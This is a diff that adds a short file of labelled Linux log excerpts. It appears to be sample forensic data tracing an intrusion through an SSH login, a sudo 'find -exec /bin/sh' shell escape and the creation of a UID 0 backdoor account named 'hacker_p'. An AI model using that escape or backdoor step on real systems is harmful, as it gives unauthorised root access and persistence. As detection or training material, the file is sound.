@@ -1,0 +1,19 @@
+#/var/log/audit/audit.log (Network Connection)
+type=SOCKADDR msg=audit(1732320540.682:1001): saddr=02000050C0A8012E0000000000000000
+type=SYSCALL msg=audit(1732320540.682:1001): arch=c000003e syscall=42 success=yes exit=0 a0=4 a1=7ffe2456b380 a2=10 a3=0 items=0 ppid=2140 pid=3452 auid=1001 uid=1001 gid=1001 euid=1001 suid=1001 fsuid=1001 egid=1001 sgid=1001 fsgid=1001 tty=(none) ses=3 comm="firefox" exe="/usr/lib64/firefox/firefox" subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key="network_socket"
+type=PROCTITLE msg=audit(1732320540.682:1001): proctitle="/usr/lib64/firefox/firefox"
+
+#/var/log/secure (Unauthorized SSH Login)
+Nov 23 01:06:42 redhat sshd[3870]: Accepted password for marketing1 from 192.168.1.46 port 52510 ssh2
+Nov 23 01:06:42 redhat sshd[3870]: pam_unix(sshd:session): session opened for user marketing1 by (uid=0)
+Nov 23 01:06:42 redhat sshd[3871]: Starting session: shell on pts/0 for marketing1 from 192.168.1.46 port 52510 id=0
+
+#/var/log/secure (GTFOBins Exploit)
+Nov 23 01:16:18 redhat sudo: marketing1 : TTY=pts/0 ; PWD=/home/marketing1 ; USER=root ; COMMAND=/usr/bin/find . -exec /bin/sh ; -quit
+Nov 23 01:16:18 redhat sudo: pam_unix(sudo:session): session opened for user root by marketing1(uid=1001)
+
+#/var/log/secure (Backdoor Creation)
+Nov 23 01:20:07 redhat useradd[4022]: new group: name=hacker_p, GID=0
+Nov 23 01:20:07 redhat useradd[4022]: new user: name=hacker_p, UID=0, GID=0, home=/home/hacker_p, shell=/bin/bash
+Nov 23 01:20:07 redhat passwd[4023]: pam_unix(passwd:chauthtok): password changed for hacker_p
+Nov 23 01:20:07 redhat useradd[4022]: add 'hacker_p' to shadow group 'root'
